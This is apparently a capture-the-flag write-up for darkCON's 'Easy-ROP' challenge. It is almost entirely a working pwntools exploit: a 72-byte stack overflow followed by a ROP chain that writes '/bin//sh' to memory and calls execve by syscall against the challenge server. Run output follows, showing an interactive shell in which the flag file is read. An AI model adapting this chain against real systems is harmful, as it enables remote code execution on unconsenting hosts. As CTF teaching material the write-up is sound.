# Pwn/Easy-ROP

Welcome to the world of pwn!!! This should be a good entry level warmup challenge !! Enjoy getting the shell
> connection : nc 65.1.92.179 49153
---
オフセット
> gdb-peda$ patto 0x4134414165414149  
> 4698452060381725001 found at offset: 72  

ex.py 
~~~
from pwn import *
from struct import pack

e = ELF('./easy-rop')
conn = remote("65.1.92.179",49153)

p = 'A'*72
p += pack('<Q', 0x000000000040f4be) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e0) # @ .data
p += pack('<Q', 0x00000000004175eb) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x0000000000481e65) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040f4be) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x0000000000446959) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000481e65) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040191a) # pop rdi ; ret
p += pack('<Q', 0x00000000004c00e0) # @ .data
p += pack('<Q', 0x000000000040f4be) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x000000000040181f) # pop rdx ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x0000000000446959) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004012d3) # syscall

conn.sendline(p)
conn.interactive()

~~~

~~~
$ python ex.py 
[*] '/home/xn/Desktop/files/easy-rop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 65.1.92.179 on port 49153: Done
[*] Switching to interactive mode
Welcome to the darkcon pwn!!
Let us know your name:$ ls
easy-rop
flag
run.sh
ynetd
$ cat flag
darkCON{w0nd3rful_m4k1n9_sh3llc0d3_us1n9_r0p!!!}
~~~
